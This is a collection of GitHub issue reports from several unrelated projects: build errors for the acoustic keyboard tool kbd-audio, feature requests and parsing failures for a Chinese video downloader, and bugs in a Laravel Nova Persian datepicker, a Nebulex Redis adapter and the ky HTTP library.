/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x51e): referencia a `SDL_GL_DeleteContext' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x528): referencia a `SDL_DestroyWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x52d): referencia a `SDL_Quit' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x56b): referencia a `SDL_GetError' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_Init(SDL_Window*)':
imgui_impl_sdl.cpp:(.text+0x92): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xa3): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xb4): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xc5): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xd6): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o):imgui_impl_sdl.cpp:(.text+0xe7): más referencias a `SDL_CreateSystemCursor' sin definir a continuación
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_GetClipboardText(void*)':
imgui_impl_sdl.cpp:(.text+0x131): referencia a `SDL_free' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x136): referencia a `SDL_GetClipboardText' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_ProcessEvent(SDL_Event*)':
imgui_impl_sdl.cpp:(.text+0x220): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x22e): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x23c): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x24b): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_Shutdown()':
imgui_impl_sdl.cpp:(.text+0x35e): referencia a `SDL_free' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x388): referencia a `SDL_FreeCursor' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_NewFrame(SDL_Window*)':
imgui_impl_sdl.cpp:(.text+0x3f1): referencia a `SDL_GetWindowSize' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x403): referencia a `SDL_GL_GetDrawableSize' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x485): referencia a `SDL_GetPerformanceCounter' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x4e4): referencia a `SDL_GetMouseState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x546): referencia a `SDL_GetKeyboardFocus' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x560): referencia a `SDL_CaptureMouse' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x5fc): referencia a `SDL_SetCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x606): referencia a `SDL_ShowCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x628): referencia a `SDL_WarpMouseInWindow' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x63b): referencia a `SDL_ShowCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x691): referencia a `SDL_GetPerformanceFrequency' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x6be): referencia a `SDL_GetWindowPosition' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x6c9): referencia a `SDL_GetGlobalMouseState' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_SetClipboardText(void*, char const*)':
imgui_impl_sdl.cpp:(.text+0x154): referencia a `SDL_SetClipboardText' sin definir
collect2: error: ld devolvió el estado de salida 1
make[2]: *** [CMakeFiles/view-full-gui.dir/build.make:88: view-full-gui] Error 1
make[1]: *** [CMakeFiles/Makefile2:74: CMakeFiles/view-full-gui.dir/all] Error 2
 I had this error when running `cmake`:

```bash
$ cmake ..
-- The C compiler identification is GNU 7.3.0
-- The CXX compiler identification is GNU 7.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Looking for pthread.h
-- Looking for pthread.h - found
-- Looking for pthread_create
-- Looking for pthread_create - not found
-- Looking for pthread_create in pthreads
-- Looking for pthread_create in pthreads - not found
-- Looking for pthread_create in pthread
-- Looking for pthread_create in pthread - found
-- Found Threads: TRUE
-- Found OpenGL: /usr/lib/x86_64-linux-gnu/libOpenGL.so
CMake Warning at CMakeLists.txt:28 (find_package):
  By not providing "FindSDL2.cmake" in CMAKE_MODULE_PATH this project has
  asked CMake to find a package configuration file provided by "SDL2", but
  CMake did not find one.

  Could not find a package configuration file provided by "SDL2" with any of
  the following names:

    SDL2Config.cmake
    sdl2-config.cmake

  Add the installation prefix of "SDL2" to CMAKE_PREFIX_PATH or set
  "SDL2_DIR" to a directory containing one of the above files.  If "SDL2"
  provides a separate development package or SDK, be sure it has been
  installed.


-- Found FFTW: /usr/lib/x86_64-linux-gnu/libfftw3.so;/usr/lib/x86_64-linux-gnu/libfftw3f.so
CMake Warning at CMakeLists.txt:32 (message):
  Unable to find SDL2 library.  It is either not installed or CMake cannot
  find it.  In the latter case, setting the USE_FINDSDL2 variable might help:

     $ cmake -D USE_FINDSDL2 ..


CMake Error at CMakeLists.txt:37 (message):
  Aborting


-- Configuring incomplete, errors occurred!
See also "/home/ritiek/Downloads/kbd-audio/build/CMakeFiles/CMakeOutput.log".
See also "/home/ritiek/Downloads/kbd-audio/build/CMakeFiles/CMakeError.log".
```

Installing `libsdl2-dev` fixed it for me:
```
$ sudo apt install libsdl2-dev
```

It may be helpful to note this in README.md please, I have a question, the first one is, the kbd tool it's a captures the characters from the keyboard using audio right? 
?? or its just capture the captures the characters using some of the keylogger technique and convert the text to audio???. 


the second one is if the first question true I mean if the tool can capture the characters from the keyboard using audio how can I use this tool to capture  from another device I mean how can i install it in devices 1 and capture  from devise 2  I change the SDL the #include <SDL.h> to  #include <SDL2/SDL.h> and seems compile but i got a problem in the linker

Scanning dependencies of target view-full-gui
[ 35%] Building CXX object CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o
[ 38%] Linking CXX executable view-full-gui
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `prepareAudioOut(stParameters const&)':
view-full-gui.cpp:(.text+0x2b3): referencia a `SDL_Init' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2c2): referencia a `SDL_GetNumAudioDevices' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2ed): referencia a `SDL_GetAudioDeviceName' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x31a): referencia a `SDL_memset' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x361): referencia a `SDL_memset' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x373): referencia a `SDL_OpenAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x3e8): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x411): referencia a `SDL_GetError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x424): referencia a `SDL_LogError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x429): referencia a `SDL_Quit' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x439): referencia a `SDL_GetError' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x44c): referencia a `SDL_LogError' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `renderWaveform(stParameters&, std::vector<int, std::allocator<int> > const&)':
view-full-gui.cpp:(.text+0x150f): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1538): referencia a `SDL_ClearQueuedAudio' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1548): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `std::_Function_handler<bool (), main::{lambda()#2}>::_M_invoke(std::_Any_data const&)':
view-full-gui.cpp:(.text+0x1ac4): referencia a `SDL_PollEvent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1b02): referencia a `SDL_PollEvent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x1b2d): referencia a `SDL_GetWindowSize' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x21c1): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x22b2): referencia a `SDL_GL_MakeCurrent' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2312): referencia a `SDL_GL_SwapWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x2468): referencia a `SDL_GetWindowID' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x24cf): referencia a `SDL_ClearQueuedAudio' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text+0x24df): referencia a `SDL_PauseAudioDevice' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `main':
view-full-gui.cpp:(.text.startup+0x7d): referencia a `SDL_Init' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1c4): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1d3): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1e2): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1ee): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x1fd): referencia a `SDL_GL_SetAttribute' sin definir
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o:view-full-gui.cpp:(.text.startup+0x20c): más referencias a `SDL_GL_SetAttribute' sin definir a continuación
/usr/bin/ld: CMakeFiles/view-full-gui.dir/view-full-gui.cpp.o: en la función `main':
view-full-gui.cpp:(.text.startup+0x227): referencia a `SDL_GetCurrentDisplayMode' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x250): referencia a `SDL_CreateWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x25d): referencia a `SDL_GL_CreateContext' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x26c): referencia a `SDL_GL_SetSwapInterval' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x51e): referencia a `SDL_GL_DeleteContext' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x528): referencia a `SDL_DestroyWindow' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x52d): referencia a `SDL_Quit' sin definir
/usr/bin/ld: view-full-gui.cpp:(.text.startup+0x56b): referencia a `SDL_GetError' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_Init(SDL_Window*)':
imgui_impl_sdl.cpp:(.text+0x92): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xa3): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xb4): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xc5): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0xd6): referencia a `SDL_CreateSystemCursor' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o):imgui_impl_sdl.cpp:(.text+0xe7): más referencias a `SDL_CreateSystemCursor' sin definir a continuación
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_GetClipboardText(void*)':
imgui_impl_sdl.cpp:(.text+0x131): referencia a `SDL_free' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x136): referencia a `SDL_GetClipboardText' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_ProcessEvent(SDL_Event*)':
imgui_impl_sdl.cpp:(.text+0x220): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x22e): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x23c): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x24b): referencia a `SDL_GetModState' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_Shutdown()':
imgui_impl_sdl.cpp:(.text+0x35e): referencia a `SDL_free' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x388): referencia a `SDL_FreeCursor' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_NewFrame(SDL_Window*)':
imgui_impl_sdl.cpp:(.text+0x3f1): referencia a `SDL_GetWindowSize' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x403): referencia a `SDL_GL_GetDrawableSize' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x485): referencia a `SDL_GetPerformanceCounter' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x4e4): referencia a `SDL_GetMouseState' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x546): referencia a `SDL_GetKeyboardFocus' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x560): referencia a `SDL_CaptureMouse' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x5fc): referencia a `SDL_SetCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x606): referencia a `SDL_ShowCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x628): referencia a `SDL_WarpMouseInWindow' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x63b): referencia a `SDL_ShowCursor' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x691): referencia a `SDL_GetPerformanceFrequency' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x6be): referencia a `SDL_GetWindowPosition' sin definir
/usr/bin/ld: imgui_impl_sdl.cpp:(.text+0x6c9): referencia a `SDL_GetGlobalMouseState' sin definir
/usr/bin/ld: libImGui.a(imgui_impl_sdl.cpp.o): en la función `ImGui_ImplSDL2_SetClipboardText(void*, char const*)':
imgui_impl_sdl.cpp:(.text+0x154): referencia a `SDL_SetClipboardText' sin definir
collect2: error: ld devolvió el estado de salida 1
make[2]: *** [CMakeFiles/view-full-gui.dir/build.make:88: view-full-gui] Error 1
make[1]: *** [CMakeFiles/Makefile2:74: CMakeFiles/view-full-gui.dir/all] Error 2
 I had this error when running `cmake`:

```bash
$ cmake ..
-- The C compiler identification is GNU 7.3.0
-- The CXX compiler identification is GNU 7.3.0
-- Check for working C compiler: /usr/bin/cc
-- Check for working C compiler: /usr/bin/cc -- works
-- Detecting C compiler ABI info
-- Detecting C compiler ABI info - done
-- Detecting C compile features
-- Detecting C compile features - done
-- Check for working CXX compiler: /usr/bin/c++
-- Check for working CXX compiler: /usr/bin/c++ -- works
-- Detecting CXX compiler ABI info
-- Detecting CXX compiler ABI info - done
-- Detecting CXX compile features
-- Detecting CXX compile features - done
-- Looking for pthread.h
-- Looking for pthread.h - found
-- Looking for pthread_create
-- Looking for pthread_create - not found
-- Looking for pthread_create in pthreads
-- Looking for pthread_create in pthreads - not found
-- Looking for pthread_create in pthread
-- Looking for pthread_create in pthread - found
-- Found Threads: TRUE
-- Found OpenGL: /usr/lib/x86_64-linux-gnu/libOpenGL.so
CMake Warning at CMakeLists.txt:28 (find_package):
  By not providing "FindSDL2.cmake" in CMAKE_MODULE_PATH this project has
  asked CMake to find a package configuration file provided by "SDL2", but
  CMake did not find one.

  Could not find a package configuration file provided by "SDL2" with any of
  the following names:

    SDL2Config.cmake
    sdl2-config.cmake

  Add the installation prefix of "SDL2" to CMAKE_PREFIX_PATH or set
  "SDL2_DIR" to a directory containing one of the above files.  If "SDL2"
  provides a separate development package or SDK, be sure it has been
  installed.


-- Found FFTW: /usr/lib/x86_64-linux-gnu/libfftw3.so;/usr/lib/x86_64-linux-gnu/libfftw3f.so
CMake Warning at CMakeLists.txt:32 (message):
  Unable to find SDL2 library.  It is either not installed or CMake cannot
  find it.  In the latter case, setting the USE_FINDSDL2 variable might help:

     $ cmake -D USE_FINDSDL2 ..


CMake Error at CMakeLists.txt:37 (message):
  Aborting


-- Configuring incomplete, errors occurred!
See also "/home/ritiek/Downloads/kbd-audio/build/CMakeFiles/CMakeOutput.log".
See also "/home/ritiek/Downloads/kbd-audio/build/CMakeFiles/CMakeError.log".
```

Installing `libsdl2-dev` fixed it for me:
```
$ sudo apt install libsdl2-dev
```

It may be helpful to note this in README.md
<---------->
146749562
There is only one plugin row saved in DB and it overwrites all time when you want to save another plugin.
<---------->
146882466
导入了cookie还是不能下载vip的完整视频 ？只下载了6分钟左右，是把chrome中对应链接的cookie那段吗 愿意帮助提交完善，但是函数列表没有给出，或者我单独开一个分支？ 现在最高支持1080p，希望能解析4k 希望能支持导入txt文本来实现批量下载
例如，将视频链接一行一个存为txt，程序导入后默认最高画质进行批量下载

example.txt里的内容：
example_url1.html
example_url2.html
 请问能编译一个32位的吗？ 下载的文件只有main.py不知道exe在哪里。 1.5版本解析不了啊？报错
[http://upload.ouliu.net/i/201905051126293sdx3.png](url) 1.5版本解析不了啊？报错
 大佬，能不能把优酷的也加进去？ win 10 64 解析地址无效，关闭面板后会报错呢 求大佬解答~~（非专业人士） 使用下载原格式设置，已经尝试过腾讯视频主界面上 部分视频的适用性。

不过在尝试解析下面地址时显示  请求超时/返回空值
https://v.qq.com/x/cover/wvmn6sg298qr2w0/q0128rs8tpj.html
https://v.qq.com/x/page/q0128rs8tpj.html

这两个地址是同一个视频。
似乎是无法检测到。

猜测是由于视频种类采取的接口或者加密方法不太一样。

视频地址是 
从https://lpl.qq.com/es/video.shtml 这里
获得 网站内部 地址 https://lpl.qq.com/es/video_detail.shtml?nid=101
网站内部镶嵌了 腾讯视频的 跳转。
以上即这两个网址的来源。

不奢望implement相应功能，但是希望能帮助确认一下 这类视频 是否 确实和常规 腾讯视频 解析方式不同。

 使用下载原格式设置，已经尝试过腾讯视频主界面上 部分视频的适用性。

不过在尝试解析下面地址时显示  请求超时/返回空值
https://v.qq.com/x/cover/wvmn6sg298qr2w0/q0128rs8tpj.html
https://v.qq.com/x/page/q0128rs8tpj.html

这两个地址是同一个视频。
似乎是无法检测到。

猜测是由于视频种类采取的接口或者加密方法不太一样。


以下信息 与视频网址 仅为 来源，不一定有用，仅供参考
视频地址是 
从https://lpl.qq.com/es/video.shtml 这里
获得 网站内部 地址 https://lpl.qq.com/es/video_detail.shtml?nid=101
网站内部镶嵌了 腾讯视频的 跳转。
以上即这两个网址的来源。

不奢望implement相应功能，但是希望能帮助确认一下 这类视频 是否 确实和常规 腾讯视频 解析方式不同。

 ![@C79$0T SRLM%1~`99U%ZSQ](https://user-images.githubusercontent.com/26380831/58142242-e0be5300-7c78-11e9-974c-3c32fffb73b3.png)
 ![@C79$0T SRLM%1~`99U%ZSQ](https://user-images.githubusercontent.com/26380831/58142242-e0be5300-7c78-11e9-974c-3c32fffb73b3.png)
  目标格式设为原格式时正常 貌似vf签名算法改了。dash 接口返回：
```
try{Q14a6169c4f9beca044569ab0faaf8da9({"msg":"This sign is not correct.","code":"A00001","data":{"ctl":{"uid":"","uip":"27.38.81.109","vf":"004ced1b975dcb662ad33768ccaae464"}}}
);}catch(e){}
```  https://www.iqiyi.com/w_19s7r5kpq1.html
 https://www.iqiyi.com/w_19s865ug09.html
点击下载就卡主了，而且没有error.log 可以解析台灣的資源嗎?
https://tw.iqiyi.com/v_19rsiyjj9g.html 您好，我最近在做视频分段以及研究DRM相关的东西，为了做一个比较安全的视频应用，现在访问了几大视频网站，发现blibli,优酷,acfun以及腾讯非会员视频等都是用的基础的m3u8格式文件的hls流媒体，都是不安全的。
我想要做成安全的，所以一直在研究几大视频网站的加密手段，发现个奇怪的现象，腾讯视频在某几次播放会员视频的时候我可以直接拦截到请求了m3u8文件！可惜我当时并未保存，后来就再也无法拦截研究了，当时只注意到腾讯的m3u8文件中使用的#EXT-X-KEY 是目前网上很少有文章讲的SAMPLE-AES加密方式，现在网络上都是AES-128的，存在的最大隐患就是可以直接通过抓取m3u8文件获取秘钥连接，而我抓的那个m3u8使用了SAMPLE-AES他的DRM是Widevine的，研究到这里我有点事情耽搁了1天，第二天再抓的时候死活抓不到了，网上到处都没有这种sample-aes的加密的具体操作的方法，所以我只能重新看一下为什么没有m3u8还能请求到ts文件片段，然后一路摸到了proxyhttp，再然后就找到您这里了。
主要是想要请问一下
        1 腾讯的播放器是自己改写了吗，为什么可以直接坐到不去请求m3u8就可以播放呢，即使我在proxyhttp文件里找到了m3u8文件的标签，但我仍不知道他是如何运作的。
        2 您是否了解SAMPLE-AES的加密方法以及解密需要改写播放器底层源码吗？
        
        谢谢！
<---------->
146934650
سلام
PersianDateTime::make('check_in')->format('hh:mm');
دستور بالا کار نمیکنه
![image](https://user-images.githubusercontent.com/9899508/52161129-c8c8c080-26d5-11e9-87f6-019c508b5807.png)
![image](https://user-images.githubusercontent.com/9899508/52161134-ded68100-26d5-11e9-9674-1d1e963626dc.png)
 I'm getting this error as soon as I upgrade to Laravel 5.8 and Nova 2.0:
```
Declaration of Aloko\PersianDatepicker\PersianDateTime::nullable() should be compatible with Laravel\Nova\Fields\Field::nullable($nullable = true, $values = NULL)
```

To fix this error you just need to change `src/PersianDateTime.php` line 54 from
```php
public function nullable()
```
to
```php
public function nullable($nullable = true, $values = null)
```

Can you please apply this fix and release the new version? Hi, when if first installed your package it worked correctly. But today when i was checking it again, i got error in js and the calendar popup is not showing.
I am using laravel 5.6 with nova ~1.0

![image](https://user-images.githubusercontent.com/42141706/56865756-dfd23280-69e6-11e9-9261-c09003c1a72b.png)
 Hi, when if first installed your package it worked correctly. But today when i was checking it again, i got error in js and the calendar popup is not showing.
I am using laravel 5.6 with nova ~1.0

![image](https://user-images.githubusercontent.com/42141706/56865756-dfd23280-69e6-11e9-9261-c09003c1a72b.png)
 Hi
I am using your tool in laravel 5.6 with nova 1.3 but when i save a date, it saves correctly in database but after saving in displaying the date in nova it has 1 day difference.
for example when i save 1398/02/09 it saves 2019-04-29 correctly in database but in nova it shows 1398/02/10.
How can i fix it?
<---------->
147096697
Implement default cluster support based on sharding distribution model (using consistent-hashing maybe?) – similar to `Nebulex.Adapters.Dist`. in my config/config.exs，i change the host address to remote address， but it does not take effect，what else do I need to modify?

config :my_app, MyApp.RedisCache,
  conn_opts: [
    # Redix options
    host: "127.0.0.1", // change host is invalid
    port: 6379
  ] We setup Redis Cluster without Sentinel and instead of getting data consistently we received 
*MOVED Redirection 
instead of it following the redirect when we try to get data. Please help, maybe it's our setup.

  config :client_compass, AppCache,
  pools: [
    primary: [
      url: "redis://172.16.43.5:6379,172.16.43.6:6380,172.16.43.7:6381,172.16.43.5:6381,172.16.43.6:6379,172.16.43.7:6380"
    ]
  ]

Any help would be appreciated.  We setup Redis Cluster without Sentinel and instead of getting data consistently we received 
*MOVED Redirection 
instead of it following the redirect when we try to get data. Please help, maybe it's our setup.

  config :client_compass, AppCache,
  pools: [
    primary: [
      url: "redis://172.16.43.5:6379,172.16.43.6:6380,172.16.43.7:6381,172.16.43.5:6381,172.16.43.6:6379,172.16.43.7:6380"
    ]
  ]

Any help would be appreciated.  Hey Cabol,

First of all fantastic library, it's super easy to use and works extremely nicely. We've had a small issue building a repeatable docker image for our elixir umbrella app. This is the error that is thrown when including the nebulex_redis_adapter

```
web_1    | 17:54:26.884 [info] Application jchash exited: exited in: :jchash.start(:normal, [])
web_1    |     ** (EXIT) an exception was raised:
web_1    |         ** (UndefinedFunctionError) function :jchash.start/2 is undefined or private
web_1    |             (jchash) :jchash.start(:normal, [])
web_1    |             (kernel) application_master.erl:277: :application_master.start_it_old/4
web_1    | {"Kernel pid terminated",application_controller,"{application_start_failure,jchash,{bad_return,{{jchash,start,[normal,[]]},{'EXIT',{undef,[{jchash,start,[normal,[]],[]},{application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,277}]}]}}}}}"}
web_1    | Kernel pid terminated (application_controller) ({application_start_failure,jchash,{bad_return,{{jchash,start,[normal,[]]},{'EXIT',{undef,[{jchash,start,[normal,[]],[]},{application_master,start_it_old
web_1    |
web_1    | Crash dump is being written to: erl_cra
``` Hey Cabol,

First of all fantastic library, it's super easy to use and works extremely nicely. We've had a small issue building a repeatable docker image for our elixir umbrella app. This is the error that is thrown when including the nebulex_redis_adapter

```
web_1    | 17:54:26.884 [info] Application jchash exited: exited in: :jchash.start(:normal, [])
web_1    |     ** (EXIT) an exception was raised:
web_1    |         ** (UndefinedFunctionError) function :jchash.start/2 is undefined or private
web_1    |             (jchash) :jchash.start(:normal, [])
web_1    |             (kernel) application_master.erl:277: :application_master.start_it_old/4
web_1    | {"Kernel pid terminated",application_controller,"{application_start_failure,jchash,{bad_return,{{jchash,start,[normal,[]]},{'EXIT',{undef,[{jchash,start,[normal,[]],[]},{application_master,start_it_old,4,[{file,\"application_master.erl\"},{line,277}]}]}}}}}"}
web_1    | Kernel pid terminated (application_controller) ({application_start_failure,jchash,{bad_return,{{jchash,start,[normal,[]]},{'EXIT',{undef,[{jchash,start,[normal,[]],[]},{application_master,start_it_old
web_1    |
web_1    | Crash dump is being written to: erl_cra
```

Tested with: `nebulex_redis_adapter ~> "1.0.0"` & `nebulex_redis_adapter ~> "1.1.0"` Hello,

Thanks for the great lib! I can see that quite some updates have happened since last release on hex.pm.

Would you be able to release?

thanks, Currently, bay default, all values except the counters are stored as `Nebulex.Object.t()` (before to put the data on Redis, the object is encoded as binary). The idea is to allow storing raw strings, not within the object, and improve the memory consumption for string data types. Implement default cluster support based on sharding distribution model (using consistent-hashing maybe?) – similar to `Nebulex.Adapters.Dist`. Hello,

Thanks for the great lib! I can see that quite some updates have happened since last release on hex.pm.

Would you be able to release?

thanks,
<---------->
147375544
Hello everybody!
I'm using Ky on an important project at work. Sadly I have to support also Edge but it seems Ky does not support it. Is there a specific reason? Will it be supported? Or at least, will the TRIDENT version of Edge - until Microsoft will release Chromium-based Edge?

Thank you very much. I'm trying to replace axios with ky:

Can you please you provide `input`, `options`(from user, not the one for `fetch`) as additional params for both hooks.
I want them to do some logging with `url` or add custom identifiers to requests.

related: #100, #114  https://travis-ci.com/sindresorhus/ky/jobs/227726270

Travis is slow. I think we might just need to increase the Puppeteer timeout somehow. Introduced by https://github.com/sindresorhus/ky/commit/d4ddb7ab4ec0d5baff73b3c038be48717592384d.

This test now fails: https://github.com/sindresorhus/ky/blob/a50948adeff0c2255626ed28465e126e095a7c04/test/hooks.js#L249

```
 hooks › `afterResponse` hook is called with input, normalized options, and response which can be used to retry

  /Users/sindresorhus/dev/oss/ky/index.js:3

   2:
   3: const getGlobal = property => {
   4:   /* istanbul ignore next */

  Rejected promise returned by test. Reason:

  Error {
    message: 'retry.methods must be an array',
  }

  normalizeRetryOptions (index.js:3:1536)
  new Ky (index.js:4:7)
  ky (index.js:8:1713)
  t.deepEqual.ky.post.hooks.afterResponse (test/hooks.js:275:15)
  fn (index.js:6:55)
```

// @whitecrownclown @lambdalisue <!-- Issuehunt Badges -->

[<img alt="Issuehunt badges" src="https://issuehunt.io/r/sindresorhus/ky/issues/2/badge.svg" />](https://issuehunt.io/r/sindresorhus/ky/issues/2)

<!-- /Issuehunt Badges -->

In addition to accepting a number, it should accept an object with the ability to specify which methods and status codes to retry on. Same as Got: https://github.com/sindresorhus/got#retry
<!-- Issuehunt content -->



> There is a $60.00 open bounty on this issue. Add more on [Issuehunt](https://issuehunt.io/r/sindresorhus/ky/issues/2).
> - Checkout the [Issuehunt explorer](https://issuehunt.io/r/sindresorhus/ky/) to discover more funded issues.
> - Need some help from other developers? [Add your repositories](https://issuehunt.io/r/new) on Issuehunt to raise funds.


<!-- /Issuehunt content--> I've seen that was added in https://github.com/sindresorhus/ky/pull/87 to "fix" https://github.com/sindresorhus/ky/issues/85. While it works well on its own (i.e. when invoking `ky` or `ky.get`/`ky.post` shorthands), it complicates the usage of the `Options` type if you ever need to manipulate them.

Take my example, we're wrapping `ky` as we'd like to convert the `body`/`json` keys to snake case before sending to the server and vice-versa on response. Something like:

```ts
import { Input, Options } from 'ky';

export default async function (input: Input, options?: Options) {
  const kyOptions = { ...options };
